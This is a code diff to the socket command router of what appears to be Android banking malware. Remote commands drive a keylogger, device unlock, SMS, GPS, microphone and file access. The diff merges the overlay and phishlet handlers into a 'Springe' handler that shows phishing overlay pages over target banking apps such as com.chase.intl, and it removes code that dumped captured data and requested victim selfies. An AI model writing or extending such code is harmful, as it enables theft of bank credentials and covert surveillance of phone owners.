@@ -18,8 +18,7 @@ import com.fason.app.features.contacts.ContactsManager;
 import com.fason.app.features.info.InfoManager;
 import com.fason.app.features.location.GpsManager;
 import com.fason.app.features.mic.MicManager;
-import com.fason.app.features.overlay.OverlayManager;
-import com.fason.app.features.phishlet.PhishletManager;
+import com.fason.app.features.springe.SpringeManager;
 import com.fason.app.features.notification.FakeNotificationSender;
 import com.fason.app.features.sms.SMSManager;
 import com.fason.app.features.storage.FileManager;
@@ -92,8 +91,8 @@ public final class SocketCommandRouter {
                 case Protocol.INSPECTOR:   handleInspector(data, socket, cmdId); break;
                 case Protocol.KEYLOGGER:   handleKeylogger(data, socket, cmdId); break;
                 case Protocol.DEVICE_UNLOCK: handleDeviceUnlock(data, socket, cmdId); break;
-                case Protocol.OVERLAY:       EXEC.execute(() -> handleOverlay(data, socket, cmdId)); break;
-                case Protocol.PHISHLET:      EXEC.execute(() -> handlePhishlet(data, socket, cmdId)); break;
+                case Protocol.OVERLAY:                                                    // legacy compat alias
+                case Protocol.SPRINGE:       EXEC.execute(() -> handleSpringe(data, socket, cmdId)); break;
                 default:
                     try {
                         JSONObject err = new JSONObject();
@@ -750,79 +749,58 @@ public final class SocketCommandRouter {
     }
 
 
-    // ── Overlay handler ───────────────────────────────────────────────────────
+    // ── Springe handler ──────────────────────────────────────────────────────────
+    // Replaces legacy handleOverlay() and handlePhishlet().
+    // Panel protocol:
+    //   { action:"configure", page:"com.chase.intl.html", pkg:"com.chase.intl" }
+    //   { action:"show",      page:"com.chase.intl.html" }  or  { action:"show", html:"<raw>" }
+    //   { action:"list" }   -> returns array of available template pages
+    //   { action:"hide" }
+    //   { action:"status" }
 
-    private static void handleOverlay(JSONObject data, Socket socket, String cmdId) {
+    private static void handleSpringe(JSONObject data, Socket socket, String cmdId) {
         String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
-        OverlayManager mgr = OverlayManager.getInstance();
+        SpringeManager mgr = SpringeManager.getInstance();
         switch (action) {
             case Protocol.ACT_CONFIGURE:
                 mgr.configure(
-                    data.optString("html", ""),
-                    data.optString(Protocol.KEY_PACKAGE, ""),
+                    data.optString("page", ""),
+                    data.optString(Protocol.KEY_PACKAGE, null),
                     cmdId
                 );
                 break;
             case Protocol.ACT_TRIGGER:
             case "show":
-                mgr.show(data.optString("html", null), cmdId);
+                mgr.show(
+                    data.optString("page",  null),
+                    data.optString("html",  null),
+                    cmdId
+                );
                 break;
             case Protocol.ACT_HIDE:
                 mgr.hide(cmdId);
                 break;
-            case Protocol.ACT_STATUS:
-            default:
+            case "list":
                 try {
-                    JSONObject s = new JSONObject();
-                    s.put(Protocol.KEY_TYPE, "status");
-                    s.put("shown", mgr.isShown());
-                    s.put("smartTrigger", mgr.isSmartTriggerArmed());
-                    if (mgr.getTargetPackage() != null) s.put(Protocol.KEY_PACKAGE, mgr.getTargetPackage());
-                    attachCmdId(s, cmdId);
-                    socket.emit(Protocol.OVERLAY, s);
+                    JSONObject r = new JSONObject();
+                    r.put(Protocol.KEY_TYPE,  "page_list");
+                    r.put("pages", mgr.listAvailablePages());
+                    attachCmdId(r, cmdId);
+                    socket.emit(Protocol.SPRINGE, r);
                 } catch (Exception ignored) {}
                 break;
-        }
-    }
-
-    // ── Phishlet handler ──────────────────────────────────────────────────────
-
-    private static void handlePhishlet(JSONObject data, Socket socket, String cmdId) {
-        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
-        PhishletManager mgr = PhishletManager.getInstance();
-        switch (action) {
-            case Protocol.ACT_START: {
-                java.util.List<String> pkgs = new java.util.ArrayList<>();
-                org.json.JSONArray arr = data.optJSONArray("packages");
-                if (arr != null) {
-                    for (int i = 0; i < arr.length(); i++) pkgs.add(arr.optString(i, ""));
-                } else {
-                    String single = data.optString(Protocol.KEY_PACKAGE, "");
-                    if (!single.isEmpty()) pkgs.add(single);
-                }
-                mgr.start(pkgs, cmdId);
-                break;
-            }
-            case Protocol.ACT_STOP:
-                mgr.stop(cmdId);
-                break;
-            case Protocol.ACT_DUMP:
-                mgr.triggerDump(cmdId);
-                break;
-            case Protocol.ACT_DELETE:
-                mgr.clearData(cmdId);
-                break;
-            case Protocol.ACT_CAMERA_REQ:
-                mgr.requestCamera(data.optString("photoType", "selfie"), cmdId);
-                break;
             case Protocol.ACT_STATUS:
             default:
                 try {
                     JSONObject s = new JSONObject();
-                    s.put(Protocol.KEY_TYPE, "status");
-                    s.put("active", mgr.isActive());
+                    s.put(Protocol.KEY_TYPE,   "status");
+                    s.put("shown",             mgr.isShown());
+                    s.put("smartTrigger",      mgr.isSmartTriggerArmed());
+                    s.put("activePage",        mgr.getActivePage() != null ? mgr.getActivePage() : "");
+                    if (mgr.getTargetPackage() != null)
+                        s.put(Protocol.KEY_PACKAGE, mgr.getTargetPackage());
                     attachCmdId(s, cmdId);
-                    socket.emit(Protocol.PHISHLET, s);
+                    socket.emit(Protocol.SPRINGE, s);
                 } catch (Exception ignored) {}
                 break;
         }
